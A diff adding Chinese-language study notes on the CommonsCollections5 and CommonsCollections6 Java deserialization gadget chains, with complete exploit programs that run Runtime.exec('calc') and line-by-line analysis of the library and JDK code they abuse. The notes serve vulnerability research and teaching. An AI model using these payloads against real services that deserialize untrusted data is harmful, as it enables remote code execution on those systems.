@@ -1844,9 +1844,9 @@ Gadget chain:
 
 在TransformingComparator.compare()中触发this.transformer.transform(obj1)，后面就是CommonsCollections3的利用。
 
-#### 问题补充
+### 问题补充
 
-##### 是否能用TreeBag&TreeMap构造
+#### 是否能用TreeBag&TreeMap构造
 
 Q：
 
@@ -1897,3 +1897,371 @@ MutableInteger是AbstractMapBag内部的一个protected类。
 这就很难搞了，因为我们无法从外部获取到MutableInteger。
 
 因此我认为很难再使用TreeBag&TreeMap构造了。
+
+## CommonsCollections5
+
+### 版本适用范围
+
+Commons-Collections 3.1-3.2.1
+
+jdk without a security manager
+
+### Exp展示
+
+```java
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import javax.management.BadAttributeValueExpException;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+
+public class CommonsCollections5 {
+    public static void main(String[] args) throws Exception {
+        Transformer Testtransformer = new ChainedTransformer(new Transformer[]{});
+
+        Transformer[] transformers=new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),
+                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),
+                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
+        };
+
+        HashMap innermap = new HashMap();
+        LazyMap map = (LazyMap)LazyMap.decorate(innermap,Testtransformer);
+        TiedMapEntry tiedmap = new TiedMapEntry(map,123);
+        BadAttributeValueExpException poc = new BadAttributeValueExpException(123);
+        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
+        val.setAccessible(true);
+        val.set(poc,tiedmap);
+
+        Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
+        field.setAccessible(true);
+        field.set(Testtransformer, transformers);
+
+        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("cc5.out"));
+        outputStream.writeObject(poc);
+        outputStream.close();
+
+        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("cc5.out"));
+        inputStream.readObject();
+    }
+}
+
+```
+
+### Exp构造分析
+
+#### 利用链展示
+
+```java
+Gadget chain:
+		ObjectInputStream.readObject()
+			BadAttributeValueExpException.readObject()
+				TiedMapEntry.toString()
+					LazyMap.get()
+						ChainedTransformer.transform()
+                    		ConstantTransformer.transform()
+								InvokerTransformer.transform()
+									Method.invoke()
+										Runtime.exec()
+```
+
+#### BadAttributeValueExpException
+
+```java
+    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
+        ObjectInputStream.GetField gf = ois.readFields();
+        Object valObj = gf.get("val", null);
+
+        if (valObj == null) {
+            val = null;
+        } else if (valObj instanceof String) {
+            val= valObj;
+        } else if (System.getSecurityManager() == null
+                || valObj instanceof Long
+                || valObj instanceof Integer
+                || valObj instanceof Float
+                || valObj instanceof Double
+                || valObj instanceof Byte
+                || valObj instanceof Short
+                || valObj instanceof Boolean) {
+            val = valObj.toString();//1
+        } else { // the serialized object is from a version without JDK-8019292 fix
+            val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
+        }
+    }
+```
+
+分析一下BadAttributeValueExpException.readObject()源码，因为SecurityManager是默认关闭的，因此`System.getSecurityManager() == null`​为真，程序会执行注释1处。
+
+分析Exp，这里会触发TiedMapEntry.toString()。
+
+#### TiedMapEntry
+
+```java
+
+	public String toString() {
+        return this.getKey() + "=" + this.getValue();
+    }
+	public Object getValue() {
+        return this.map.get(this.key);//1
+    }
+```
+
+程序在注释1处会触发LazyMap.get()，后续的执行流程则和CommonsCollections1相同。
+
+## CommonsCollections6
+
+### 版本适用范围
+
+commons-collections : 3.1～3.2.1
+
+### Exp展示
+
+```java
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.HashSet;
+import java.util.Map;
+
+public class CommonsCollections6 {
+    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
+
+        Transformer Testtransformer = new ChainedTransformer(new Transformer[]{});
+
+        Transformer[] transformers=new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),
+                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),
+                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
+        };
+
+        Map map=new HashMap();
+        Map lazyMap=LazyMap.decorate(map,Testtransformer);
+        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"cc6");
+
+        HashSet hashSet=new HashSet(1);
+        hashSet.add(tiedMapEntry);
+        lazyMap.remove("cc6");
+
+        //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令
+        Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
+        field.setAccessible(true);
+        field.set(Testtransformer, transformers);
+
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("cc6.out"));
+        objectOutputStream.writeObject(hashSet);
+        objectOutputStream.close();
+
+        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("cc6.out"));
+        objectInputStream.readObject();
+
+    }
+}
+```
+
+### Exp构造分析
+
+#### 利用链展示
+
+```java
+HashSet.readObject()/HashMap.readObject()
+    HashMap.put()
+        HashMap.hash()
+            TiedMapEntry.hashCode()
+                LazyMap.get()
+                    ChainedTransformer.transform()
+                        InvokerTransformer.transform()
+```
+
+#### HashSet
+
+```java
+    private void readObject(java.io.ObjectInputStream s)
+        throws java.io.IOException, ClassNotFoundException {
+        // Read in any hidden serialization magic
+        s.defaultReadObject();
+
+        // Read capacity and verify non-negative.
+        int capacity = s.readInt();
+        if (capacity < 0) {
+            throw new InvalidObjectException("Illegal capacity: " +
+                                             capacity);
+        }
+
+        // Read load factor and verify positive and non NaN.
+        float loadFactor = s.readFloat();
+        if (loadFactor <= 0 || Float.isNaN(loadFactor)) {
+            throw new InvalidObjectException("Illegal load factor: " +
+                                             loadFactor);
+        }
+
+        // Read size and verify non-negative.
+        int size = s.readInt();
+        if (size < 0) {
+            throw new InvalidObjectException("Illegal size: " +
+                                             size);
+        }
+        // Set the capacity according to the size and load factor ensuring that
+        // the HashMap is at least 25% full but clamping to maximum capacity.
+        capacity = (int) Math.min(size * Math.min(1 / loadFactor, 4.0f),
+                HashMap.MAXIMUM_CAPACITY);
+
+        // Constructing the backing map will lazily create an array when the first element is
+        // added, so check it before construction. Call HashMap.tableSizeFor to compute the
+        // actual allocation size. Check Map.Entry[].class since it's the nearest public type to
+        // what is actually created.
+
+        SharedSecrets.getJavaOISAccess()
+                     .checkArray(s, Map.Entry[].class, HashMap.tableSizeFor(capacity));
+
+        // Create backing HashMap
+        map = (((HashSet<?>)this) instanceof LinkedHashSet ?
+               new LinkedHashMap<E,Object>(capacity, loadFactor) :
+               new HashMap<E,Object>(capacity, loadFactor));
+
+        // Read in all elements in the proper order.
+        for (int i=0; i<size; i++) {
+            @SuppressWarnings("unchecked")
+                E e = (E) s.readObject();
+            map.put(e, PRESENT);//1
+        }
+    }
+```
+
+程序在反序列化时，在注释1处，执行HashMap.put()
+
+#### HashMap
+
+```java
+    public V put(K key, V value) {
+        return putVal(hash(key), key, value, false, true);
+    }
+    static final int hash(Object key) {
+        int h;
+        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);//1
+    }
+```
+
+程序在注释1处执行TiedMapEntry.hashCode()
+
+#### TiedMapEntry
+
+```java
+    public int hashCode() {
+        Object value = this.getValue();
+        return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());
+    }
+    public Object getValue() {
+        return this.map.get(this.key);//1
+    }
+```
+
+程序在注释1处触发LazyMap.get()。
+
+#### LazyMap
+
+```java
+    public Object get(Object key) {
+        if (!super.map.containsKey(key)) {
+            Object value = this.factory.transform(key);//1
+            super.map.put(key, value);
+            return value;
+        } else {
+            return super.map.get(key);
+        }
+    }
+```
+
+程序在注释1处会执行我们恶意构造的payload。
+
+### 问题补充
+
+#### lazyMap.remove("cc6")
+
+Q1：
+
+为何要把cc6删除掉
+
+A1：
+
+主要和LazyMap有关
+
+```java
+    public Object get(Object key) {
+        if (!super.map.containsKey(key)) {//1
+            Object value = this.factory.transform(key);
+            super.map.put(key, value);
+            return value;
+        } else {
+            return super.map.get(key);//2
+        }
+    }
+```
+
+如果不删除则会执行注释2，这样就触发不了payload。
+
+Q2：
+
+cc6这个值是在哪里赋值给lazyMap的呢？
+
+A2：
+
+在hashSet.add(tiedMapEntry)，这个过程和Exp利用链基本一样。
+
+```java
+    //HashSet
+	public boolean add(E e) {
+        return map.put(e, PRESENT)==null;
+    }
+	//HashMap
+    public V put(K key, V value) {
+        return putVal(hash(key), key, value, false, true);
+    }
+    static final int hash(Object key) {
+        int h;
+        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
+    }
+
+	//.......和Exp利用链相同
+
+	//ChainedTransformer
+    public Object transform(Object object) {
+        for(int i = 0; i < this.iTransformers.length; ++i) {
+            object = this.iTransformers[i].transform(object);
+        }
+
+        return object;//1
+    }
+```
+
+因为`Transformer Testtransformer = new ChainedTransformer(new Transformer[]{})`​，所以注释1处返回cc6。
+
+因此lazyMap有一个键值对"cc6"->"cc6"。
+
+#### Testtransformer
+
+Q：
+
+为何要先用`Testtransformer`​构造，再用反射更改`iTransformers`​。
+
+A：
+
+否则会在反序列化之前触发payload，导致程序中止。
